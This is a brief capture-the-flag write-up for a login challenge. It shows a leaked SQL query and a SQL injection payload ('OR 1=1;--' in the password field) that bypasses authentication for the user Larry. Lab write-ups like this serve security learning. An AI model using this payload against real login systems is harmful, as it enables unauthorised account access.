# Without Password

Another login challenge, first check for SQLI and notice that SQLI is happened in the password box by using single quote.

The response return 500 and a login SQL query:
`select password from challenge_users where userid = 'Larry' and password = '123''`

So, a small SQLI payload to get the flag:
`username_login=Larry&password_login=123'+OR+1=1;--`
